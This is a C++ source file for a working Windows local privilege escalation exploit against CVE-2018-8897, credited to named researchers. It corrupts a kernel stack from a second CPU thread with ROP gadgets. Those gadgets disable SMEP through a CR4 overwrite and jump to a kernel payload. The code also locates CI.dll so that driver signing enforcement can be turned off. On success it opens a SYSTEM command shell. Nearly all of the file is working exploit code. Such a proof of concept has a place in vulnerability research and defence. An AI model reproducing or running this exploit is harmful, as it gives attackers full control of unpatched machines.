/*
*	Module Name:
*		movss_popss.cpp
*
*	Abstract:
*		Implements the POP/MOV SS (CVE-2018-8897) vulnerability by utilizing
*		SYSCALL to gain system privileges from a limited application (local
*		privilege escalation).
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*		Nemanja (Nemi) Mulasmajic <nm@triplefault.io> | http://triplefault.io/
*
*/

#include "stdafx.h"
#include "movss_popss.h"
#include "symbols.hpp"
#include "asm.h"
#include "ps.h"

#define STACK_PATCH_POINT -0xA30

extern "C"
{
	// This is the global memory address we apply the hardware breakpoint on.
	uint16_t _StackSelector = 0;

	// A replica of the global above. Avoids triggering the hardware breakpoint.
	uint64_t _CopyStackSelector = 0;

	// The stack pointer of CPU0 before it begins executing the exploit.
	uint64_t _CPU0StackPointer = 0;

	// Represents whether or not CPU1 is ready to begin corrupting CPU0's stack.
	uint8_t _CPU1Ready = FALSE;

	// Our new GSBASE.
	PBYTE _SpoofedGSBase = NULL;

	// The original GSBASE.
	PVOID _OriginalGSBase = NULL;

	// Our _KPCR.Prcb.CurrentThread value.
	PBYTE _SpoofedCurrentThread = NULL;

	// Our _KTHREAD.ApcState.Process value.
	PBYTE _SpoofedCurrentProcess = NULL;

	// Our _KPCR.CurrentPrcb value.
	PBYTE _SpoofedPrcb = NULL;

	// The image base of ntoskrnl.exe.
	PVOID _NtoskrnlBaseAddress = 0;

	// The image base of CI.dll.
	PVOID _CiBaseAddress = 0;

	// The RVA of nt!PsInitialSystemProcess.
	uint64_t _PsInitialSystemProcessOffset = 0;

	// The RVA of nt!ExAllocatePoolWithTag.
	uint64_t _ExAllocatePoolWithTagOffset = 0;

	// The RVA of CI!g_CiOptions.
	uint64_t _g_CiOptionsOffset = 0;

	// Offset of _KPCR.CurrentPrcb.
	uint64_t _CurrentPrcbOffset = 0;

	// Offset of _KPCR.Prcb.CurrentThread.
	uint64_t _CurrentThreadOffset = 0;

	// Offset of _KTHREAD.ApcState.Process.
	uint64_t _CurrentProcessOffset = 0;

	// Offset of _EPROCESS.Token.
	uint64_t _ProcessTokenOffset = 0;

	// ROP gadget RVAs.
	uint64_t _Gadget1Offset = 0, _Gadget2Offset = 0, _Gadget3Offset = 0;
}

/*
*	The entry point of the program.
*/
int main(_In_ int /* argc */, _In_ char** /* argv */)
{
	pprintf("Loaded at 0x%p.\n", &__ImageBase);

	// As a hint so that the scheduler doesn't preempt the process much.
	if (!SetPriorityClass(NtCurrentProcess(), REALTIME_PRIORITY_CLASS))
	{
		pprintf("ERROR: Failed to set priority class of process.\n");
		return 1;
	}

	// CPU0 runs the exploit. It'd be nice if it ran slower than CPU1, so that
	// CPU1 can corrupt CPU0's stack, but it's unlikely that this will be 
	// guaranteed since CPU0 will execute the exploit without interrupts on.
	if (!SetThreadPriority(NtCurrentThread(), THREAD_PRIORITY_LOWEST))
	{
		pprintf("ERROR: Failed to set priority class of thread.\n");
		return 1;
	}

	pprintf("Checking system for compatability.\n");

	// We need 2 dedicated cores for this exploit.
	if (!SysCheckCompatability())
	{
		pprintf("ERROR: System is not compatible.\n");
		return 1;
	}
	
	pprintf("Searching for loaded kernel modules: ntoskrnl.exe and CI.dll.\n");

	// Find the base address of ntoskrnl.exe and CI.dll. CI is needed to disable
	// driver signing enforcement.
	if (!SysFindDrivers())
	{
		pprintf("ERROR: Failed to find required kernel modules.\n");

		return 1;
	}

	pprintf("Loading required kernel offsets.\n");
	
	// Load required kernel symbols and find offsets that we need for exploitation.
	if (!SymFindKernelOffsets())
	{
		pprintf("ERROR: Failed to load symbols.\n");
		return 1;
	}

	// List the user account we're currently executing as.
	pprintf("Currently executing under:\n\t- ");
	system("whoami");

	pprintf("Forcing exploit to run on CPU0.\n");

	// CPU0 runs the sploit.
	SetThreadAffinityMask(NtCurrentThread(), 1);

	pprintf("Preparing process for exploitation.\n");

	// We need to make sure memory that we use in usermode stays paged in.
	// It's sorta difficult to ensure this without administrator privileges, so 
	// we'll just make suggestions to the memory manager ;).
	if (!PsPrepareProcess())
	{
		pprintf("ERROR: Failed to prepare process for exploitation.\n");
		return 1;
	}

	// Create a new thread to run exclusively on CPU1.
	pprintf("Spawning new thread to overwrite return address on usermode stack.\n");

	DWORD ThreadId = 0;
	HANDLE ThreadHandle = CreateThread(NULL, 0, Cpu1CorruptStack, NULL, 0, &ThreadId);
	if (!ThreadHandle)
	{
		pprintf("ERROR: Failed to create worker thread. Code: %u.\n", GetLastError());
		return 1;
	}

	pprintf("Worker thread created (0x%p): %u.\n", ThreadHandle, ThreadId);
	
	CloseHandle(ThreadHandle);

	// Store off valid SS.
	__store_ss(&_StackSelector);
	_CopyStackSelector = _StackSelector;

	pprintf("Current SS value: 0x%x.\n", _StackSelector);

	pprintf("Priming hardware breakpoints on the stored SS value: 0x%p.\n", &_StackSelector);

	if (!WinSetDataBreakpoint((uintptr_t)&_StackSelector, BREAKPOINT_SIZE::Two))
	{
		pprintf("ERROR: Failed to set break on access hardware breakpoint.\n");
		return 1;
	}

	_OriginalGSBase = __readgsbase();

	pprintf("Current GS base: 0x%p.\n", _OriginalGSBase);
	pprintf("Writing user-controlled memory region for GS base: 0x%p.\n", _SpoofedGSBase);

	*((PVOID*)&_SpoofedGSBase[_CurrentThreadOffset]) = _SpoofedCurrentThread;
	*((PVOID*)&_SpoofedGSBase[_CurrentPrcbOffset]) = _SpoofedPrcb;
	*((PVOID*)&_SpoofedCurrentThread[_CurrentProcessOffset]) = _SpoofedCurrentProcess;

	__try
	{
		// Now we execute the exploit with a GS base under our control and a user stack.
		AsmExecuteExploit();
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	__writegsbase(_OriginalGSBase);

	puts("");

	// If we get here, something failed.
	pprintf("ERROR: Exploit failed to run. Is your machine patched?\n");

	system("pause");

	TerminateProcess(NtCurrentProcess(), 1);
}

/*
*	The return from the kernelmode payload to usermode.
*/
extern "C" void __stdcall RestoreToUsermode()
{
	__writegsbase(_OriginalGSBase);

	puts("");

	pprintf("SUCCESS: Exploit executed successfuly.\n");

	// List the user account we're currently executing as.
	pprintf("Currently executing under:\n\t -");
	system("whoami");
	puts("");
	fflush(stdout);

	system("pause");
	system("cmd");

	TerminateProcess(NtCurrentProcess(), 0);
}

/*
*	Check that the machine has at least 2 cores.
*/
bool SysCheckCompatability()
{
	// Make sure that there are at least 2 cores on this machine.
	SYSTEM_INFO SystemInfo;
	GetSystemInfo(&SystemInfo);

	pprintf("Machine has %u processors.\n", SystemInfo.dwNumberOfProcessors);

	if (SystemInfo.dwNumberOfProcessors < 2)
	{
		pprintf("ERROR: There needs to be at least 2 cores available for this exploit to work.\n");
		return false;
	}

	return true;
}

/*
*	Finds ntoskrnl.exe/CI.dll in the loaded driver list.
*/
bool SysFindDrivers()
{
	std::vector<PVOID> Drivers;

	// Walk the loaded driver list.
	while (TRUE)
	{
		DWORD Needed = 0;
		EnumDeviceDrivers(Drivers.data(), (DWORD)(Drivers.size() * sizeof(PVOID)), &Needed);

		if (Drivers.size() == (Needed / sizeof(PVOID)))
			break;

		Drivers.resize(Needed / sizeof(PVOID));
	}

	pprintf("There are %zu drivers loaded.\n", Drivers.size());	 

	// Find the ones we care about.
	for (auto& Driver : Drivers)
	{
		WCHAR DriverName[MAX_PATH + 1] = { 0 };
		GetDeviceDriverBaseNameW(Driver, DriverName, (RTL_NUMBER_OF(DriverName) - 1));
			
		if (!_wcsicmp(DriverName, L"ntoskrnl.exe"))
		{
			_NtoskrnlBaseAddress = Driver;
		}
		else if (!_wcsicmp(DriverName, L"CI.dll"))
		{
			_CiBaseAddress = Driver;
		}
	}

	if (!_NtoskrnlBaseAddress)
	{
		pprintf("ERROR: Failed to find ntoskrnl.exe in loaded driver list.\n");

		return false;
	}

	if (!_CiBaseAddress)
	{
		pprintf("ERROR: Failed to find ci.dll in loaded driver list.\n");

		return false;
	}

	pprintf("ntoskrnl loaded at 0x%p, CI loaded at 0x%p.\n", _NtoskrnlBaseAddress, _CiBaseAddress);

	return true;
}

/*
*	Executes as a separate thread on CPU1. Continuously overwrites key 
*	values on the stack on CPU0.
*/
DWORD WINAPI Cpu1CorruptStack(_In_ PVOID /* Argument */)
{
	pprintf("Forcing worker thread to run on CPU1.\n");

	// CPU1 runs the worker thread, since it can't be run on CPU0.
	SetThreadAffinityMask(NtCurrentThread(), 2);

	if (!SetThreadPriority(NtCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL))
	{
		pprintf("ERROR: Failed to set priority class of thread.\n");
		return 1;
	}

	// Wait until CPU0 transitions to a ready state.
	while (!_CPU0StackPointer)
	{
		_mm_pause();
	}
	
	// Our goal is to gain execution on the return from KeContextFromKframes.
	volatile uintptr_t* PatchPoint = (uintptr_t*)(_CPU0StackPointer + STACK_PATCH_POINT);

	PatchPoint[0] = OFFSET_ROP_GADGET_1;
	PatchPoint[0x414] = OFFSET_ROP_GADGET_2; 
	PatchPoint[0x415] = NEW_CR4_VALUE;				// Disable SMEP (bit 20).
	PatchPoint[0x416] = OFFSET_ROP_GADGET_3;
	PatchPoint[0x417] = (uintptr_t)AsmKernelPayload;

	pprintf("CPU1 corrupting stack around RSP: 0x%p.\n", PatchPoint);

	// CPU1 is ready for stack contents to probe.
	_CPU1Ready = TRUE;

	// KiSystemCall64 gets interrupted with the pending #DB and is thrown into 
	// KiDebugTrapOrFault. 

	// KiDebugTrapOrFault -> KiExceptionDispatch -> KiDispatchException -> 
	// KeContextFromKframes
	
	AsmClobberValue((PVOID*)&PatchPoint[0], OFFSET_ROP_GADGET_1);

	return 0;
}